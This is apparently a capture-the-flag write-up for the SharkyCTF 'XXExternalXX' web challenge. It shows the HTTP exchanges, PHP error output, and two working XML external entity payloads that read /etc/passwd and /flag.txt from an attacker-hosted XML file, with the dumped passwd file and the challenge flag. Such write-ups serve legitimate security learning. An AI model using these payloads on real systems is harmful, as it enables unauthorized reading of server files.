# ctf

# SharkyCTF

1. XXExternalXX

[Index.html]
Request
```
GET / HTTP/1.1
Host: xxexternalxx.sharkyctf.xyz
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```

Response
```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sun, 10 May 2020 07:20:36 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1124
```
```html
<!DOCTYPE html>
<html lang="fr" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>XXExternalXX</title>
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
  </head>
  <body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
      <a class="navbar-brand" href="#">XXExternalXX</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarText" aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarText">
        <ul class="navbar-nav mr-auto">
          <li class="nav-item active">
            <a class="nav-link" href="/">Home</a>
          </li>
          <li class="nav-item active">
            <a class="nav-link" href="?xml=data.xml">Show stored data</a>
          </li>
        </ul>
      </div>
    </nav>
    <div class="container">
        <h1>Welcome to this platform</h1>
    <p>To check all the news we uploaded, please go to the "news" section</p>
        </div>


  </body>
</html>
```
Try something...
```
GET /?xml=data.xml HTTP/1.1
Host: xxexternalxx.sharkyctf.xyz
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```
Response
```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sun, 10 May 2020 07:21:33 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1167
```
```html
<!DOCTYPE html>
<html lang="fr" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>XXExternalXX</title>
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
  </head>
  <body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
      <a class="navbar-brand" href="#">XXExternalXX</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarText" aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarText">
        <ul class="navbar-nav mr-auto">
          <li class="nav-item active">
            <a class="nav-link" href="/">Home</a>
          </li>
          <li class="nav-item active">
            <a class="nav-link" href="?xml=data.xml">Show stored data</a>
          </li>
        </ul>
      </div>
    </nav>
    <div class="container">
          <h1>News</h1>
      <pre> 17/09/2019 the platform is now online, the fonctionnalities it contains will be audited by one of our society partenairs</pre>
        </div>


  </body>
</html>
```
I tried some payload.
```
http://xxexternalxx.sharkyctf.xyz/?xml=asdf
```
Response
```
<br />
<b>Warning</b>:  file_get_contents(asdf): failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>20</b><br />
<br />
<b>Warning</b>:  DOMDocument::loadXML(): Empty string supplied as input in <b>/var/www/html/index.php</b> on line <b>23</b><br />
<br />
<b>Warning</b>:  simplexml_import_dom(): Invalid Nodetype to import in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Notice</b>:  Trying to get property 'data' of non-object in <b>/var/www/html/index.php</b> on line <b>25</b><br />
```
We have ```file_get_contents()``` function in php, so I can add link as http://example.com/file.xml and execute file .xml,
and file data.xml like:
```xml
<root>
    <data>17/09/2019 the platform is now online, the fonctionnalities it contains will be audited by one of our society partenairs</data>
</root>
```
And I add URL to my server and get /etc/passwd

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin
```
```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```
![Image](https://github.com/n9uyen/ctf/blob/master/passwd.png?raw=true)


And flag is ```shkCTF{G3T_XX3D_f5ba4f9f9c9e0f41dd9df266b391447a}```

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///flag.txt" >
]>
<root>
	<data>&file;</data>
</root>
```
![Image](https://github.com/n9uyen/ctf/blob/master/flag.png)



